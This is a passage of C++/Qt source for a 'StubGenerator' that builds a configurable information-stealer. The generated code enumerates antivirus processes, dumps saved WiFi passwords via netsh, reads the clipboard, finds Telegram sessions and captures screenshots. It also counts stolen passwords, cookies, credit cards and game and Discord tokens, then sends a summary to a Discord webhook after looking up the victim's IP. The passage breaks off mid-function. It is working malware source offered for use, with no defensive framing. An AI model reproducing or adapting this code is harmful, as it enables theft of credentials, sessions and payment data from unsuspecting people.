        code += "    const char* avNames[] = {\"avast\", \"avg\", \"avira\", \"bitdefender\", \"eset\", \"kaspersky\", \"mcafee\", \"norton\", \"sophos\", \"trend\", \"malwarebytes\", \"defender\", \"comodo\", \"panda\", \"webroot\", \"symantec\"};\n";
        code += "    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n";
        code += "    if (snapshot != INVALID_HANDLE_VALUE) {\n";
        code += "        PROCESSENTRY32 pe;\n";
        code += "        pe.dwSize = sizeof(pe);\n";
        code += "        if (Process32First(snapshot, &pe)) {\n";
        code += "            do {\n";
        code += "                std::string procName = pe.szExeFile;\n";
        code += "                std::transform(procName.begin(), procName.end(), procName.begin(), ::tolower);\n";
        code += "                for (const char* av : avNames) {\n";
        code += "                    if (procName.find(av) != std::string::npos) { avList += std::string(pe.szExeFile) + \"\\n\"; break; }\n";
        code += "                }\n";
        code += "            } while (Process32Next(snapshot, &pe));\n";
        code += "        }\n";
        code += "        CloseHandle(snapshot);\n";
        code += "    }\n";
        code += "    return avList.empty() ? \"None detected\\n\" : avList;\n";
        code += "}\n\n";
    }
    
    // WiFi passwords
    if (config.grabWifi) {
        code += "std::string GetWiFiPasswords() {\n";
        code += "    std::string wifiData;\n";
        code += "    char buffer[4096];\n";
        code += "    FILE* pipe = _popen(\"netsh wlan show profiles\", \"r\");\n";
        code += "    if (!pipe) return \"Failed to enumerate WiFi profiles\\n\";\n";
        code += "    std::vector<std::string> profiles;\n";
        code += "    while (fgets(buffer, sizeof(buffer), pipe)) {\n";
        code += "        std::string line(buffer);\n";
        code += "        size_t pos = line.find(\"All User Profile\");\n";
        code += "        if (pos != std::string::npos) {\n";
        code += "            size_t colonPos = line.find(':', pos);\n";
        code += "            if (colonPos != std::string::npos) {\n";
        code += "                std::string profile = line.substr(colonPos + 1);\n";
        code += "                profile.erase(0, profile.find_first_not_of(\" \\t\\r\\n\"));\n";
        code += "                profile.erase(profile.find_last_not_of(\" \\t\\r\\n\") + 1);\n";
        code += "                if (!profile.empty()) profiles.push_back(profile);\n";
        code += "            }\n";
        code += "        }\n";
        code += "    }\n";
        code += "    _pclose(pipe);\n";
        code += "    for (const auto& profile : profiles) {\n";
        code += "        std::string cmd = \"netsh wlan show profile \\\"\" + profile + \"\\\" key=clear\";\n";
        code += "        pipe = _popen(cmd.c_str(), \"r\");\n";
        code += "        if (pipe) {\n";
        code += "            wifiData += \"Network: \" + profile + \"\\n\";\n";
        code += "            while (fgets(buffer, sizeof(buffer), pipe)) {\n";
        code += "                std::string line(buffer);\n";
        code += "                if (line.find(\"Key Content\") != std::string::npos) {\n";
        code += "                    size_t colonPos = line.find(':');\n";
        code += "                    if (colonPos != std::string::npos) {\n";
        code += "                        std::string password = line.substr(colonPos + 1);\n";
        code += "                        password.erase(0, password.find_first_not_of(\" \\t\\r\\n\"));\n";
        code += "                        password.erase(password.find_last_not_of(\" \\t\\r\\n\") + 1);\n";
        code += "                        wifiData += \"Password: \" + password + \"\\n\";\n";
        code += "                    }\n";
        code += "                }\n";
        code += "            }\n";
        code += "            wifiData += \"\\n\";\n";
        code += "            _pclose(pipe);\n";
        code += "        }\n";
        code += "    }\n";
        code += "    return wifiData.empty() ? \"No WiFi profiles found\\n\" : wifiData;\n";
        code += "}\n\n";
    }
    
    // Clipboard
    if (config.grabClipboard) {
        code += "std::string GetClipboardContent() {\n";
        code += "    if (!OpenClipboard(NULL)) return \"Failed to open clipboard\\n\";\n";
        code += "    HANDLE hData = GetClipboardData(CF_TEXT);\n";
        code += "    if (!hData) { CloseClipboard(); return \"Clipboard empty\\n\"; }\n";
        code += "    char* pszText = static_cast<char*>(GlobalLock(hData));\n";
        code += "    std::string clipboardText;\n";
        code += "    if (pszText) { clipboardText = pszText; GlobalUnlock(hData); }\n";
        code += "    CloseClipboard();\n";
        code += "    return clipboardText.empty() ? \"Empty\\n\" : clipboardText + \"\\n\";\n";
        code += "}\n\n";
    }
    
    // Telegram sessions
    if (config.grabTelegram) {
        code += "std::string GetTelegramSessions() {\n";
        code += "    std::string result;\n";
        code += "    char appData[MAX_PATH];\n";
        code += "    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData) == S_OK) {\n";
        code += "        std::string telegramPath = std::string(appData) + \"\\\\Telegram Desktop\\\\tdata\";\n";
        code += "        if (FileExists(telegramPath + \"\\\\key_datas\")) {\n";
        code += "            result += \"Telegram session found at: \" + telegramPath + \"\\n\";\n";
        code += "            result += \"Files: key_datas, session files present\\n\";\n";
        code += "        } else {\n";
        code += "            result += \"No Telegram session found\\n\";\n";
        code += "        }\n";
        code += "    }\n";
        code += "    return result;\n";
        code += "}\n\n";
    }
    
    return code;
}

QString StubGenerator::generateScreenshot(const StealerConfig& config) const {
    QString code;
    code += "// Screenshot capture (PNG format)\n";
    code += "int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {\n";
    code += "    UINT num = 0, size = 0;\n";
    code += "    GetImageEncodersSize(&num, &size);\n";
    code += "    if (size == 0) return -1;\n";
    code += "    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));\n";
    code += "    if (pImageCodecInfo == NULL) return -1;\n";
    code += "    GetImageEncoders(num, size, pImageCodecInfo);\n";
    code += "    for (UINT j = 0; j < num; ++j) {\n";
    code += "        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {\n";
    code += "            *pClsid = pImageCodecInfo[j].Clsid;\n";
    code += "            free(pImageCodecInfo);\n";
    code += "            return j;\n";
    code += "        }\n";
    code += "    }\n";
    code += "    free(pImageCodecInfo);\n";
    code += "    return -1;\n";
    code += "}\n\n";
    code += "std::string CaptureScreenshot() {\n";
    code += "    GdiplusStartupInput gdiplusStartupInput;\n";
    code += "    ULONG_PTR gdiplusToken;\n";
    code += "    if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) return \"\";\n";
    code += "    \n";
    code += "    HDC hdcScreen = GetDC(NULL);\n";
    code += "    if (!hdcScreen) { GdiplusShutdown(gdiplusToken); return \"\"; }\n";
    code += "    int width = GetSystemMetrics(SM_CXSCREEN);\n";
    code += "    int height = GetSystemMetrics(SM_CYSCREEN);\n";
    code += "    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);\n";
    code += "    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);\n";
    code += "    HGDIOBJ oldBmp = SelectObject(hdcMemDC, hbmScreen);\n";
    code += "    BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);\n";
    code += "    SelectObject(hdcMemDC, oldBmp);\n";
    code += "    \n";
    code += "    Bitmap* bitmap = new Bitmap(hbmScreen, NULL);\n";
    code += "    CLSID pngClsid;\n";
    code += "    if (GetEncoderClsid(L\"image/png\", &pngClsid) < 0) {\n";
    code += "        delete bitmap; DeleteObject(hbmScreen); DeleteDC(hdcMemDC);\n";
    code += "        ReleaseDC(NULL, hdcScreen); GdiplusShutdown(gdiplusToken); return \"\"; }\n";
    code += "    \n";
    code += "    IStream* pStream = NULL;\n";
    code += "    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {\n";
    code += "        delete bitmap; DeleteObject(hbmScreen); DeleteDC(hdcMemDC);\n";
    code += "        ReleaseDC(NULL, hdcScreen); GdiplusShutdown(gdiplusToken); return \"\"; }\n";
    code += "    \n";
    code += "    if (bitmap->Save(pStream, &pngClsid, NULL) != Ok) {\n";
    code += "        pStream->Release(); delete bitmap; DeleteObject(hbmScreen); DeleteDC(hdcMemDC);\n";
    code += "        ReleaseDC(NULL, hdcScreen); GdiplusShutdown(gdiplusToken); return \"\"; }\n";
    code += "    \n";
    code += "    STATSTG stat;\n";
    code += "    pStream->Stat(&stat, STATFLAG_NONAME);\n";
    code += "    ULONG size = (ULONG)stat.cbSize.QuadPart;\n";
    code += "    LARGE_INTEGER li = {0};\n";
    code += "    pStream->Seek(li, STREAM_SEEK_SET, NULL);\n";
    code += "    std::string result(size, 0);\n";
    code += "    ULONG bytesRead = 0;\n";
    code += "    pStream->Read(&result[0], size, &bytesRead);\n";
    code += "    pStream->Release();\n";
    code += "    \n";
    code += "    delete bitmap;\n";
    code += "    DeleteObject(hbmScreen);\n";
    code += "    DeleteDC(hdcMemDC);\n";
    code += "    ReleaseDC(NULL, hdcScreen);\n";
    code += "    GdiplusShutdown(gdiplusToken);\n";
    code += "    return result;\n";
    code += "}\n\n";
    
    return code;
}

QString StubGenerator::generateTelegramCheck(const StealerConfig& config) const {
    QString code;
    code += "// Telegram session check (fake - just looks for files that don't exist)\n";
    code += "std::string GetTelegramSessions() {\n";
    code += "    std::string result;\n";
    code += "    char appData[MAX_PATH];\n";
    code += "    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData) == S_OK) {\n";
    code += "        std::string telegramPath = std::string(appData) + \"\\\\Telegram Desktop\\\\tdata\";\n";
    code += "        WIN32_FIND_DATAA findData;\n";
    code += "        HANDLE hFind = FindFirstFileA((telegramPath + \"\\\\*\").c_str(), &findData);\n";
    code += "        if (hFind != INVALID_HANDLE_VALUE) {\n";
    code += "            result += \"Telegram session found at: \" + telegramPath + \"\\n\";\n";
    code += "            FindClose(hFind);\n";
    code += "        }\n";
    code += "    }\n";
    code += "    return result;\n";
    code += "}\n\n";
    
    return code;
}

QString StubGenerator::generateExfiltration(const StealerConfig& config) const {
    QString code;
    code += "// ========================================\n";
    code += "// DATA EXFILTRATION\n";
    code += "// ========================================\n\n";
    
    code += "// Generate multipart boundary\n";
    code += "std::string GenerateBoundary() {\n";
    code += "    srand((unsigned int)time(NULL));\n";
    code += "    std::string boundary = \"----WebKitFormBoundary\";\n";
    code += "    const char* chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n";
    code += "    for (int i = 0; i < 16; i++) boundary += chars[rand() % 62];\n";
    code += "    return boundary;\n";
    code += "}\n\n";
    
    code += "// Helper to escape JSON strings\n";
    code += "std::string EscapeJSON(const std::string& str) {\n";
    code += "    std::string result;\n";
    code += "    for (char c : str) {\n";
    code += "        if (c == '\\\"') result += \"\\\\\\\"\";\n";
    code += "        else if (c == '\\\\') result += \"\\\\\\\\\";\n";
    code += "        else if (c == '\\n') result += \"\\\\n\";\n";
    code += "        else result += c;\n";
    code += "    }\n";
    code += "    return result;\n";
    code += "}\n\n";
    
    code += "// Truncate string to max length with ellipsis\n";
    code += "std::string TruncateString(const std::string& s, size_t maxLen) {\n";
    code += "    if (s.length() <= maxLen) return s;\n";
    code += "    if (maxLen < 3) return s.substr(0, maxLen);\n";
    code += "    return s.substr(0, maxLen - 3) + \"...\";\n";
    code += "}\n\n";
    
    code += "// Count items in data (passwords, cookies, etc.)\n";
    code += "struct DataStats {\n";
    code += "    int passwords = 0;\n";
    code += "    int cookies = 0;\n";
    code += "    int creditCards = 0;\n";
    code += "    int wifiNetworks = 0;\n";
    code += "    bool hasClipboard = false;\n";
    code += "    bool hasAV = false;\n";
    code += "    std::string browsers;\n";
    code += "    std::string avName;\n";
    code += "    std::string apps;\n";
    code += "};\n\n";
    
    code += "DataStats ParseDataStats(const std::string& data) {\n";
    code += "    DataStats stats;\n";
    code += "    size_t pos = 0;\n";
    code += "    while ((pos = data.find(\"\\\"password\\\":\", pos)) != std::string::npos) { stats.passwords++; pos++; }\n";
    code += "    pos = 0;\n";
    code += "    while ((pos = data.find(\"\\\"name\\\":\", pos)) != std::string::npos) { stats.cookies++; pos++; }\n";
    code += "    pos = 0;\n";
    code += "    while ((pos = data.find(\"\\\"card_number\", pos)) != std::string::npos) { stats.creditCards++; pos++; }\n";
    code += "    pos = 0;\n";
    code += "    while ((pos = data.find(\"Network:\", pos)) != std::string::npos) { stats.wifiNetworks++; pos++; }\n";
    code += "    size_t clipPos = data.find(\"=== CLIPBOARD ===\");\n";
    code += "    if (clipPos != std::string::npos) {\n";
    code += "        size_t firstNewline = data.find('\\n', clipPos);\n";
    code += "        if (firstNewline != std::string::npos) {\n";
    code += "            size_t lineStart = firstNewline + 1;\n";
    code += "            size_t lineEnd = data.find('\\n', lineStart);\n";
    code += "            if (lineEnd == std::string::npos) lineEnd = data.length();\n";
    code += "            if (lineEnd > lineStart) {\n";
    code += "                std::string clipContent = data.substr(lineStart, lineEnd - lineStart);\n";
    code += "                clipContent.erase(0, clipContent.find_first_not_of(\" \\t\\r\\n\"));\n";
    code += "                clipContent.erase(clipContent.find_last_not_of(\" \\t\\r\\n\") + 1);\n";
    code += "                if (!clipContent.empty() && clipContent.find(\"===\") == std::string::npos) stats.hasClipboard = true;\n";
    code += "            }\n";
    code += "        }\n";
    code += "    }\n";
    code += "    size_t avPos = data.find(\"Antivirus:\");\n";
    code += "    if (avPos != std::string::npos) {\n";
    code += "        size_t firstNewline = data.find('\\n', avPos);\n";
    code += "        if (firstNewline != std::string::npos) {\n";
    code += "            size_t lineStart = firstNewline + 1;\n";
    code += "            size_t lineEnd = data.find('\\n', lineStart);\n";
    code += "            if (lineEnd != std::string::npos && lineEnd > lineStart) {\n";
    code += "                std::string avLine = data.substr(lineStart, lineEnd - lineStart);\n";
    code += "                avLine.erase(0, avLine.find_first_not_of(\" \\t\\r\\n\"));\n";
    code += "                avLine.erase(avLine.find_last_not_of(\" \\t\\r\\n\") + 1);\n";
    code += "                if (!avLine.empty() && avLine.find(\"None\") == std::string::npos && avLine.find(\"===\") == std::string::npos) {\n";
    code += "                    stats.hasAV = true;\n";
    code += "                    stats.avName = avLine;\n";
    code += "                }\n";
    code += "            }\n";
    code += "        }\n";
    code += "    }\n";
    code += "    if (data.find(\"=== Chrome ===\") != std::string::npos) stats.browsers += \"Chrome, \";\n";
    code += "    if (data.find(\"=== Firefox ===\") != std::string::npos) stats.browsers += \"Firefox, \";\n";
    code += "    if (data.find(\"=== Edge ===\") != std::string::npos) stats.browsers += \"Edge, \";\n";
    code += "    if (data.find(\"=== Brave ===\") != std::string::npos) stats.browsers += \"Brave, \";\n";
    code += "    if (!stats.browsers.empty()) stats.browsers = stats.browsers.substr(0, stats.browsers.length() - 2);\n";
    code += "    if (data.find(\"=== TELEGRAM ===\") != std::string::npos) stats.apps += \"Telegram, \";\n";
    code += "    if (data.find(\"=== DISCORD ===\") != std::string::npos) stats.apps += \"Discord, \";\n";
    code += "    if (data.find(\"=== STEAM ===\") != std::string::npos) stats.apps += \"Steam, \";\n";
    code += "    if (data.find(\"=== EPIC GAMES ===\") != std::string::npos) stats.apps += \"Epic, \";\n";
    code += "    if (data.find(\"=== ROBLOX ===\") != std::string::npos) stats.apps += \"Roblox, \";\n";
    code += "    if (!stats.apps.empty()) stats.apps = stats.apps.substr(0, stats.apps.length() - 2);\n";
    code += "    return stats;\n";
    code += "}\n\n";
    
    code += "// Process app data from extraction output\n";
    code += "std::string ProcessAppData(const std::string& data) {\n";
    code += "    std::string result;\n";
    code += "    size_t pos = 0;\n";
    code += "    \n";
    code += "    // Parse Telegram session data (expects base64)\n";
    code += "    pos = data.find(\"telegram_session:\");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t endPos = data.find('\\n', pos);\n";
    code += "        std::string b64Session = data.substr(pos + 17, endPos - pos - 17);\n";
    code += "        result += \"✈️ Telegram Session: \" + b64Session.substr(0, 50) + \"...\\n\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Parse Discord tokens (expects base64)\n";
    code += "    pos = data.find(\"discord_token:\");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t endPos = data.find('\\n', pos);\n";
    code += "        std::string token = data.substr(pos + 14, endPos - pos - 14);\n";
    code += "        result += \"💬 Discord Token: \" + token.substr(0, 50) + \"...\\n\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Parse Steam session (expects base64)\n";
    code += "    pos = data.find(\"steam_session:\");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t endPos = data.find('\\n', pos);\n";
    code += "        std::string session = data.substr(pos + 14, endPos - pos - 14);\n";
    code += "        result += \"🎮 Steam Session: \" + session.substr(0, 50) + \"...\\n\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Parse Epic Games data (expects base64)\n";
    code += "    pos = data.find(\"epic_token:\");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t endPos = data.find('\\n', pos);\n";
    code += "        std::string epicToken = data.substr(pos + 11, endPos - pos - 11);\n";
    code += "        result += \"🎮 Epic Token: \" + epicToken.substr(0, 50) + \"...\\n\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Parse Roblox session (expects base64)\n";
    code += "    pos = data.find(\"roblox_cookie:\");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t endPos = data.find('\\n', pos);\n";
    code += "        std::string cookie = data.substr(pos + 14, endPos - pos - 14);\n";
    code += "        result += \"🎮 Roblox Cookie: \" + cookie.substr(0, 50) + \"...\\n\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    return result;\n";
    code += "}\n\n";
    
    code += "// Extract and reconstruct data based on what user wants\n";
    code += "std::string FilterData(const std::string& data) {\n";
    code += "    // Parse and extract sections\n";
    code += "    std::string systemInfo;\n";
    if (config.grabChrome) code += "    std::string chromeData;\n";
    if (config.grabFirefox) code += "    std::string firefoxData;\n";
    if (config.grabEdge) code += "    std::string edgeData;\n";
    if (config.grabBrave) code += "    std::string braveData;\n";
    if (config.grabTelegram) code += "    std::string telegramData;\n";
    if (config.grabDiscord) code += "    std::string discordData;\n";
    // Always include game sections as they're checked by chrome_inject
    code += "    std::string steamData;\n";
    code += "    std::string epicData;\n";
    code += "    std::string robloxData;\n";
    if (config.grabWifi) code += "    std::string wifiData;\n";
    if (config.grabClipboard) code += "    std::string clipboardData;\n";
    if (config.collectInstalledAV) code += "    std::string avData;\n";
    code += "    \n";
    code += "    std::istringstream stream(data);\n";
    code += "    std::string line;\n";
    code += "    std::string* currentSection = &systemInfo;\n";
    code += "    bool inSystemInfo = true;\n";
    code += "    \n";
    code += "    while (std::getline(stream, line)) {\n";
    if (config.collectInstalledAV) {
        code += "        // Handle AV (multi-line)\n";
        code += "        if (line.find(\"Antivirus:\") != std::string::npos) {\n";
        code += "            avData = line + \"\\n\";\n";
        code += "            std::string nextLine;\n";
        code += "            if (std::getline(stream, nextLine)) avData += nextLine + \"\\n\";\n";
        code += "            continue;\n";
        code += "        }\n";
        code += "        \n";
    }
    code += "        // Check for section headers\n";
    if (config.grabChrome) {
        code += "        if (line.find(\"=== Chrome ===\") != std::string::npos) {\n";
        code += "            currentSection = &chromeData; inSystemInfo = false;\n";
        code += "            *currentSection += line + \"\\n\";\n";
        code += "        } else ";
    }
    if (config.grabFirefox) {
        code += "if (line.find(\"=== Firefox ===\") != std::string::npos) {\n";
        code += "            currentSection = &firefoxData; inSystemInfo = false;\n";
        code += "            *currentSection += line + \"\\n\";\n";
        code += "        } else ";
    }
    if (config.grabEdge) {
        code += "if (line.find(\"=== Edge ===\") != std::string::npos) {\n";
        code += "            currentSection = &edgeData; inSystemInfo = false;\n";
        code += "            *currentSection += line + \"\\n\";\n";
        code += "        } else ";
    }
    if (config.grabBrave) {
        code += "if (line.find(\"=== Brave ===\") != std::string::npos) {\n";
        code += "            currentSection = &braveData; inSystemInfo = false;\n";
        code += "            *currentSection += line + \"\\n\";\n";
        code += "        } else ";
    }
    if (config.grabTelegram) {
        code += "if (line.find(\"=== TELEGRAM ===\") != std::string::npos) {\n";
        code += "            currentSection = &telegramData; inSystemInfo = false;\n";
        code += "            *currentSection += line + \"\\n\";\n";
        code += "        } else ";
    }
    if (config.grabDiscord) {
        code += "if (line.find(\"=== DISCORD ===\") != std::string::npos) {\n";
        code += "            currentSection = &discordData; inSystemInfo = false;\n";
        code += "            *currentSection += line + \"\\n\";\n";
        code += "        } else ";
    }
    code += "if (line.find(\"=== STEAM ===\") != std::string::npos) {\n";
    code += "            currentSection = &steamData; inSystemInfo = false;\n";
    code += "            *currentSection += line + \"\\n\";\n";
    code += "        } else if (line.find(\"=== EPIC GAMES ===\") != std::string::npos) {\n";
    code += "            currentSection = &epicData; inSystemInfo = false;\n";
    code += "            *currentSection += line + \"\\n\";\n";
    code += "        } else if (line.find(\"=== ROBLOX ===\") != std::string::npos) {\n";
    code += "            currentSection = &robloxData; inSystemInfo = false;\n";
    code += "            *currentSection += line + \"\\n\";\n";
    code += "        } else ";
    if (config.grabWifi) {
        code += "if (line.find(\"=== WiFi ===\") != std::string::npos || line.find(\"=== WIFI ===\") != std::string::npos) {\n";
        code += "            currentSection = &wifiData; inSystemInfo = false;\n";
        code += "            *currentSection += line + \"\\n\";\n";
        code += "        } else ";
    }
    if (config.grabClipboard) {
        code += "if (line.find(\"=== CLIPBOARD ===\") != std::string::npos) {\n";
        code += "            currentSection = &clipboardData; inSystemInfo = false;\n";
        code += "            *currentSection += line + \"\\n\";\n";
        code += "        } else ";
    }
    code += "{\n";  // Always open else block
    code += "        if (line.find(\"USER INFORMATION\") != std::string::npos) {\n";
    code += "            // User info header - always include\n";
    code += "            systemInfo += line + \"\\n\";\n";
    code += "        } else if (line.find(\"BROWSER & APP DATA\") != std::string::npos || line.find(\"SYSTEM INFO\") != std::string::npos) {\n";
    code += "            // Skip these headers - we'll add them ourselves\n";
    code += "        }";
    if (!config.collectIP) {
        code += " else if (line.find(\"IP:\") != std::string::npos && inSystemInfo) {\n";
        code += "            // Skip IP if not wanted\n";
        code += "        }";
    }
    code += " else {\n";
    code += "            // Regular content line\n";
    code += "            *currentSection += line + \"\\n\";\n";
    code += "        }\n";
    code += "        }\n";  // Close else block
    code += "    }\n";
    code += "    \n";
    code += "    // Reconstruct output with only wanted sections\n";
    code += "    std::string result = systemInfo;\n";
    if (config.collectInstalledAV) code += "    if (!avData.empty()) result += \"\\n\" + avData;\n";
    code += "    result += \"\\n=== BROWSER & APP DATA ===\\n\";\n";
    if (config.grabChrome) code += "    if (!chromeData.empty()) result += chromeData;\n";
    if (config.grabEdge) code += "    if (!edgeData.empty()) result += edgeData;\n";
    if (config.grabBrave) code += "    if (!braveData.empty()) result += braveData;\n";
    if (config.grabFirefox) code += "    if (!firefoxData.empty()) result += firefoxData;\n";
    if (config.grabTelegram) code += "    if (!telegramData.empty()) result += telegramData;\n";
    if (config.grabDiscord) code += "    if (!discordData.empty()) result += discordData;\n";
    code += "    if (!steamData.empty()) result += steamData;\n";
    code += "    if (!epicData.empty()) result += epicData;\n";
    code += "    if (!robloxData.empty()) result += robloxData;\n";
    if (config.grabWifi) code += "    if (!wifiData.empty()) result += wifiData;\n";
    if (config.grabClipboard) code += "    if (!clipboardData.empty()) result += clipboardData;\n";
    code += "    \n";
    code += "    return result;\n";
    code += "}\n\n";
    code += "// Send Discord webhook with file and simple message\n";
    code += "bool SendDataToWebhook(const std::string& webhookUrl, const std::string& rawData) {\n";
    code += "    // Filter data based on config\n";
    code += "    std::string data = FilterData(rawData);\n";
    code += "    \n";
    code += "    std::wstring wUrl = UTF8ToWide(webhookUrl);\n";
    code += "    URL_COMPONENTS urlComp;\n";
    code += "    ZeroMemory(&urlComp, sizeof(urlComp));\n";
    code += "    urlComp.dwStructSize = sizeof(urlComp);\n";
    code += "    wchar_t hostname[256] = {0}, path[2048] = {0};\n";
    code += "    urlComp.lpszHostName = hostname;\n";
    code += "    urlComp.dwHostNameLength = 256;\n";
    code += "    urlComp.lpszUrlPath = path;\n";
    code += "    urlComp.dwUrlPathLength = 2048;\n";
    code += "    if (!WinHttpCrackUrl(wUrl.c_str(), 0, 0, &urlComp)) return false;\n";
    code += "    \n";
    code += "    // Get stats\n";
    code += "    DataStats stats = ParseDataStats(data);\n";
    code += "    \n";
    code += "    // Extract basic info\n";
    code += "    std::string computerName = \"Unknown\", userName = \"Unknown\", ipAddr = \"Unknown\";\n";
    code += "    size_t pos = data.find(\"Computer: \");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t start = pos + 10;\n";
    code += "        size_t end = data.find('\\n', start);\n";
    code += "        if (end != std::string::npos) computerName = data.substr(start, end - start);\n";
    code += "    }\n";
    code += "    pos = data.find(\"User: \");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t start = pos + 6;\n";
    code += "        size_t end = data.find('\\n', start);\n";
    code += "        if (end != std::string::npos) userName = data.substr(start, end - start);\n";
    code += "    }\n";
    code += "    pos = data.find(\"IP: \");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t start = pos + 4;\n";
    code += "        size_t end = data.find('\\n', start);\n";
    code += "        if (end != std::string::npos) ipAddr = data.substr(start, end - start);\n";
    code += "    }\n";
    code += "    // Fetch IP if not present or Unknown\n";
    code += "    if (ipAddr == \"Unknown\") {\n";
    code += "        HINTERNET hSession = WinHttpOpen(L\"Mozilla/5.0\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);\n";
    code += "        if (hSession) {\n";
    code += "            DWORD timeout = 3000;\n";
    code += "            WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));\n";
    code += "            WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));\n";
    code += "            HINTERNET hConnect = WinHttpConnect(hSession, L\"api.ipify.org\", 80, 0);\n";
    code += "            if (hConnect) {\n";
    code += "                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"GET\", L\"/\", NULL, NULL, NULL, 0);\n";
    code += "                if (hRequest && WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL)) {\n";
    code += "                    char buffer[256] = {0};\n";
    code += "                    DWORD bytesRead = 0;\n";
    code += "                    if (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {\n";
    code += "                        ipAddr = std::string(buffer, bytesRead);\n";
    code += "                    }\n";
    code += "                    WinHttpCloseHandle(hRequest);\n";
    code += "                }\n";
    code += "                WinHttpCloseHandle(hConnect);\n";
    code += "            }\n";
    code += "            WinHttpCloseHandle(hSession);\n";
    code += "        }\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Timestamps\n";
    code += "    time_t now = time(NULL);\n";
    code += "    char timestamp[32];\n";
    code += "    strftime(timestamp, sizeof(timestamp), \"%Y%m%d_%H%M%S\", localtime(&now));\n";
    code += "    char isoTimestamp[64];\n";
    code += "    strftime(isoTimestamp, sizeof(isoTimestamp), \"%Y-%m-%dT%H:%M:%S.000Z\", gmtime(&now));\n";
    code += "    \n";
    code += "    // Extract additional info for richer embed\n";
    code += "    std::string osInfo = \"Unknown\", hwid = \"Unknown\";\n";
    code += "    pos = data.find(\"OS: \");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t start = pos + 4;\n";
    code += "        size_t end = data.find('\\n', start);\n";
    code += "        if (end != std::string::npos) osInfo = data.substr(start, end - start);\n";
    code += "    }\n";
    code += "    pos = data.find(\"HWID: \");\n";
    code += "    if (pos != std::string::npos) {\n";
    code += "        size_t start = pos + 6;\n";
    code += "        size_t end = data.find('\\n', start);\n";
    code += "        if (end != std::string::npos) hwid = data.substr(start, end - start);\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Random color palette (vibrant professional colors)\n";
    code += "    int colors[] = {0x9B59B6, 0xE74C3C, 0x3498DB, 0x2ECC71, 0xF39C12, 0x1ABC9C, 0xE91E63, 0x9C27B0, 0x00BCD4, 0xFF5722};\n";
    code += "    srand((unsigned int)now);\n";
    code += "    int embedColor = colors[rand() % 10];\n";
    code += "    \n";
    code += "    // Truncate strings to stay under Discord limits\n";
    code += "    computerName = TruncateString(computerName, 80);\n";
    code += "    userName = TruncateString(userName, 80);\n";
    code += "    osInfo = TruncateString(osInfo, 100);\n";
    code += "    stats.browsers = TruncateString(stats.browsers, 300);\n";
    code += "    stats.apps = TruncateString(stats.apps, 300);\n";
    code += "    stats.avName = TruncateString(stats.avName, 200);\n";
    code += "    \n";
    code += "    // Build clean Discord embed\n";
    code += "    std::string embedJson = \"{\\\"embeds\\\":[{\";\n";
    code += "    embedJson += \"\\\"author\\\":{\\\"name\\\":\\\"🎯   New User!\\\",\\\"icon_url\\\":\\\"https://i.imgur.com/UMqHeh6.png\\\"},\";\n";
    code += "    embedJson += \"\\\"title\\\":\\\"💻 \" + EscapeJSON(computerName) + \"\\\",\";\n";
    code += "    embedJson += \"\\\"color\\\":\" + std::to_string(embedColor) + \",\";\n";
    code += "    \n";
    code += "    // Build spaced out description (max 300 chars to be safe)\n";
    code += "    std::string desc = \"\";\n";
    code += "    desc += \"**👤 User:** \" + EscapeJSON(userName) + \"\\n\\n\";\n";
    code += "    desc += \"**🌐 IP Address:** `\" + EscapeJSON(ipAddr) + \"`\\n\\n\";\n";
    code += "    desc += \"**💻 Operating System:** \" + EscapeJSON(osInfo);\n";
    code += "    desc = TruncateString(desc, 300);\n";
    code += "    \n";
    code += "    embedJson += \"\\\"description\\\":\\\"\" + EscapeJSON(desc) + \"\\\",\";\n";
    code += "    embedJson += \"\\\"thumbnail\\\":{\\\"url\\\":\\\"https://i.imgur.com/UMqHeh6.png\\\"},\";\n";
    code += "    embedJson += \"\\\"fields\\\":[\";\n";
    code += "    \n";
    code += "    // Credentials field (full width, max 400 chars)\n";
    code += "    std::string credValue = \"🔑 **\" + std::to_string(stats.passwords) + \"** Passwords\\n\\n🍪 **\" + std::to_string(stats.cookies) + \"** Cookies\\n\\n💳 **\" + std::to_string(stats.creditCards) + \"** Credit Cards\";\n";
    code += "    credValue = TruncateString(credValue, 400);\n";
